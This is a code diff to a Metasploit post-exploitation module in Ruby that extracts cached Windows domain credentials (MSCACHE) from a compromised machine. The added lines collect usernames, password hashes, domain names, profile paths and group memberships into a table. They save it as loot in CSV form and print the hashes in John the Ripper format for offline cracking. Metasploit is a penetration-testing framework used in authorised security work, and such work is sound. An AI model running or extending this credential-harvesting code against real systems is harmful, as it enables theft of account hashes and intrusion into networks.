@@ -315,7 +315,6 @@ class Metasploit3 < Msf::Post
 
 		vprint_good "Additional groups\t: #{relativeId.join ' '}"
 
-
 		if( s.logonDomainNameLength != 0 )
 			logonDomainName = dec_data[i...i+s.logonDomainNameLength+1]
 			i+=s.logonDomainNameLength
@@ -323,6 +322,23 @@ class Metasploit3 < Msf::Post
 			vprint_good "Logon domain name\t: #{logonDomainName}"
 		end
 
+			@credentials << 
+				[
+					username,
+					hash.unpack("H*")[0],
+					logonDomainName,
+					dnsDomainName,
+			 		last.strftime("%F %T"),
+					upn,
+					effectiveName,
+					fullName,
+					logonScript,
+					profilePath,
+					homeDirectory,
+					homeDirectoryDrive,
+					s.primaryGroupId,
+					relativeId.join(' '),
+				]
 
 		vprint_good "----------------------------------------------------------------------"
 		return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
@@ -422,6 +438,27 @@ class Metasploit3 < Msf::Post
 
 
 	def run
+		@credentials = Rex::Ui::Text::Table.new(
+		'Header'    => "MSCACHE Credentials",
+		'Indent'    => 1,
+		'Columns'   =>
+		[
+			"Username",
+			"Hash",
+			"Logon Domain Name",
+			"DNS Domain Name",
+			"Last Login",
+			"UPN",
+			"Effective Name",
+			"Full Name",
+			"Logon Script",
+			"Profile Path",
+			"Home Directory",
+			"HomeDir Drive",
+			"Primary Group",
+			"Additional Groups"
+		])
+
 		begin
 			print_status("Executing module against #{session.sys.config.sysinfo['Computer']}")
 			client.railgun.netapi32()
@@ -481,6 +518,9 @@ class Metasploit3 < Msf::Post
 				end
 			end
 
+			store_loot("mscache.creds", "text/csv", session, @credentials.to_csv,
+				"mscache_credentials.txt", "MSCACHE Credentials")
+
 			print_status("John the Ripper format:")
 
 			john.split("\n").each do |pass|
@@ -501,4 +541,3 @@ class Metasploit3 < Msf::Post
 		end
 	end
 end
-
